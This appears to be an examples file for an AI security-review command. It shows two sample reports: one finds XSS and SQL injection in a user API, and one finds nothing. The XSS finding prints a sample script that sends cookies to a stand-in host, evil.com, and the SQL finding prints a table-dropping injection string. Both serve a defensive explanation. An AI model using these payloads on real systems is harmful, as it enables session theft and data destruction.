# Security Review Examples

## Invocation

```bash
# Default output path
/review:security-review

# Custom output path
/review:security-review audits/security/
```

## Sample Report — Vulnerabilities Found

```markdown
# Security Review Report

**Date**: 2025-07-10T09:45:00Z
**Branch**: feat/user-api
**Commit**: f7g8h9i
**Reviewer**: Claude Code (security-review)
**Confidence Threshold**: 8/10 minimum

## Summary
- **HIGH Severity**: 1 finding
- **MEDIUM Severity**: 1 finding
- **Total**: 2 actionable vulnerabilities

---

# Vuln 1: XSS: `src/views/profile.ejs:42`

* Severity: HIGH
* Confidence: 9/10
* Description: User input from the `username` parameter is directly interpolated into HTML using `<%- username %>` (unescaped) instead of `<%= username %>` (escaped), allowing reflected XSS attacks.
* Exploit Scenario: Attacker crafts URL like `/profile?username=<script>document.location='https://evil.com/steal?c='+document.cookie</script>` to execute JavaScript in the victim's browser, enabling session hijacking.
* Recommendation: Use escaped output `<%= username %>` instead of `<%- username %>`. The unescaped syntax should only be used for trusted HTML content, never user input.

# Vuln 2: SQL Injection: `src/api/search.ts:28`

* Severity: MEDIUM
* Confidence: 8/10
* Description: The search query parameter is concatenated directly into a SQL string: `db.raw(\`SELECT * FROM products WHERE name LIKE '%\${query}%'\`)`. While the Knex ORM provides parameterized queries, `db.raw()` bypasses this protection.
* Exploit Scenario: Attacker sends `GET /api/search?q='; DROP TABLE products; --` to execute arbitrary SQL. The LIKE clause context limits exploitation but UNION-based attacks remain possible for data exfiltration.
* Recommendation: Use Knex parameterized binding: `db.raw('SELECT * FROM products WHERE name LIKE ?', [\`%\${query}%\`])` or use the query builder: `db('products').where('name', 'like', \`%\${query}%\`)`

---
```

## Sample Report — Clean Review

```markdown
# Security Review Report

**Date**: 2025-07-12T14:20:00Z
**Branch**: refactor/config-module
**Commit**: j1k2l3m
**Reviewer**: Claude Code (security-review)
**Confidence Threshold**: 8/10 minimum

## Summary
- **HIGH Severity**: 0 findings
- **MEDIUM Severity**: 0 findings
- **Total**: 0 actionable vulnerabilities

---

No high-confidence security vulnerabilities were identified in this change set.

The refactoring maintains existing security patterns and does not introduce new attack surfaces. Configuration handling continues to use validated environment variables through the existing config module.

---
```
